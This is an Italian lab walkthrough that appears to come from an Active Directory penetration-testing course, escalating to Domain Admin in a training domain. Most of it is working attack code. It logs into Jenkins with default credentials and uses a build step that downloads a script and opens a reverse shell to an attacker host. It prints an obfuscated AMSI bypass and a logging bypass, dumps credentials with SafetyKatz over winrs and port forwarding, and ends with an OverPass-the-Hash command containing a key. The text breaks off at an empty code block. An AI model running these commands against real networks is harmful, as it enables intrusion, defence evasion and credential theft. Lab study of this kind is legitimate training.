# LEARNING OBJECTIVE7

<div data-full-width="true"><figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure></div>

1. Identifica una macchina nel dominio target dove una sessione Domain Admins e' disponibile
2. Compromettere la macchina e scalare i privilegi a Domain Admin abusando di una rev-shell su dcorp-ci
3.  Scalare i privilegi a Domain Admins abusando il local admin di dcorp-adminsrv. Su dcorp-adminsrv, gestire l'elenco delle applicazioni consentite utilizzando:

    * Errori nelle regole Applocker
    * Disabilita Applocker modificando la GPO applicabile a dcorp-adminsrv

    ### SVOLGIMENTO

1.Eseguire InviShell, creare lista server (se e' possibile poiche piu OPSEC) ed eseguire Invoke-SessionHunter

```powershell
RunWithRegistryNonAdmin.bat
```

```powershell
 . C:\AD\Tools\Invoke-SessionHunter.ps1
```

```powershell
 Invoke-SessionHunter -NoPortScan -RawResults -Targets C:\AD\Tools\servers.txt.txt | select Hostname,UserSession,Access
```

servers.txt

<figure><img src="../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

Ci sono diverse sessioni admin ma non abbiamo attualmente accesso, proviamo a rieseguire con jenkins la rev shell

#### Utilizzando i privilegi dell'utente del servizio Jenkins su 172.16.3.11:8080, ottenere i privilegi su 172.16.3.11, il dcorp-ci server

Navigare su 172.16.3.11:8080 ed eseguire il login usando le default credentials <kbd>builduser:builduser</kbd>

<figure><img src="../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Selezionare un progetto dalla liste e modificarlo

<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Cliccare su <kbd>Configure</kbd> e poi selezionare <kbd>Execute Windows Batch Command</kbd> nel menu <kbd>Add build step</kbd> inserendo il seguente payload:

```
powershell iex(iwr http://172.16.100.178/Zainetti.ps1 -UseBasicParsing);Power -Reverse -IPAddress 172.16.100.178 -Port 443
```

prerequisiti:

* Host Invoke-PowerShellTcp con hfs (io l ho chiamato Zainetti)
* Aggiungi eccezione firewall sulla student vm (172.16.100.178) oppure disattivalo completamente, siamo gia' admin grazie all'abuso locale su AbyssServer.
* Attiva listener netcat su student vm

<figure><img src="../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

ESECUZIONE REVSHELL VIA JENKINS GUI E RELATIVO ACCESSO SU dcorp-ci.dollarcorp.moneycorp.local

Clicchiamo su <kbd>Build Now</kbd> nella GUI di Jenkins e BOOM!

<figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>

Abbiamo ottenuto una reverse-shell su <kbd>dcorp-ci</kbd> come <kbd>ciadmin</kbd> sfruttando Jenkins.

Possiamo usare `Find-DomainUserLocation` di Powerview con la  reverse-shell  per cercare i computer su cui è connesso un amministratore di dominio. Per prima cosa, dobbiamo bypassare AMSI e lo script block logging .

Per prima cosa, bypassiamo script block logging in modo che il bypass di AMSI non venga registrato. Potremmo anche usare questi bypass nel cradle iniziale di download-esecuzione che abbiamo usato in Jenkins.

```powershell
iex (iwr http://172.16.100.178/sbloggingbypass.txt -UseBasicParsing)
(Esecuzione in memoria di sbloggingbypass, hostato dalla student vm con hfs)

```

Eseguiamo Bypass AMSI

```
S`eT-It`em ( 'V'+'aR' +  'IA' + (("{1}{0}"-f'1','blE:')+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),(("{0}{1}" -f '.M','an')+'age'+'men'+'t.'),('u'+'to'+("{0}{2}{1}" -f 'ma','.','tion')),'s',(("{1}{0}"-f 't','Sys')+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+("{0}{1}" -f 'ni','tF')+("{1}{0}"-f 'ile','a'))  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+("{1}{0}" -f'ubl','P')+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
```

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Caricamento PowerView ed esecuzione `Find-DomainUserLocation`

```powershell
iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.X/PowerView.ps1'))
```

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (38).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

```powershell
winrs -r:dcorp-mgmt cmd /c "set hostname && set computername"
```

<figure><img src="../.gitbook/assets/image (39).png" alt=""><figcaption></figcaption></figure>

Ora eseguiremo SafetyKatz.exe su <kbd>dcorp-mgmt</kbd> per estrarre le credenziali da esso. Per farlo, dobbiamo copiare Loader.exe su dcorp-mgmt. Scarichiamo <kbd>Loader.exe su dcorp-ci e copiamolo da lì su dcorp-mgmt</kbd>. Questo per evitare qualsiasi attività di download su dcorp-mgmt.

Esegui il seguente comando sulla reverse-shell:

```powershell
iwr http://172.16.100.x/Loader.exe -OutFile C:\Users\Public\Loader.exe
(Scarichiamo su dcorp-ci usando hfs Loader.exe)
```

Adesso copiamo Loader.exe da <kbd>dcorp-ci</kbd> a <kbd>dcorp-mgmt</kbd>&#x20;

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
```

<figure><img src="../.gitbook/assets/image (40).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>

Utilizzando winrs, aggiungere il seguente port forwarding su <kbd>dcorp-mgmt</kbd> per evitare il rilevamento su dcorp-mgmt:

```powershell
$null | winrs -r:dcorp-mgmt "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.178"
```

Si prega di notare che è necessario utilizzare la variabile $null per risolvere i problemi di reindirizzamento dell'output.

Per eseguire SafetyKatz su dcorp-mgmt, lo scaricheremo ed eseguiremo in memoria utilizzando Loader. Eseguire il seguente comando sulla rev-shell&#x20;

```powershell
$null | winrs -r:dcorp-mgmt "cmd /c C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe sekurlsa::evasive-keys exit"
```

<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

Ottimo! Abbiamo ottenuto le credenziali di svcadmin, un amministratore di dominio. Si noti che svcadmin viene utilizzato come account di servizio (vedere “Sessione” nell'output sopra), quindi è possibile ottenere le credenziali in chiaro da lsasecrets!

Utilizzare OverPass-the-Hash per riprodurre le credenziali svcadmin\
Infine, utilizzare OverPass-the-Hash per utilizzare le credenziali svcadmin.

Eseguire i comandi riportati di seguito da una shell con privilegi elevati sulla VM dello studente per utilizzare Rubeus. Si noti che è possibile utilizzare qualsiasi strumento desiderato (Invoke-Mimi, SafetyKatz, Rubeus ecc.):

```powershell
C:\AD\Tools\Loade
xe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Nel nuovo prompt verificare l'accesso al dc come svcadmin usando <kbd>winrs</kbd>

```powershell
winrs -r:dcorp-dc cmd /c set username
```

<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>

### 2.Abuse Derivative Local Admin

Passando ora al compito successivo, dobbiamo passare all'amministratore di dominio utilizzando l'amministratore locale derivato. Scopriamo su quali macchine abbiamo i privilegi di amministratore locale. In una sessione PowerShell avviata utilizzando Invisi-Shell, inserisci il seguente comando.

```
```
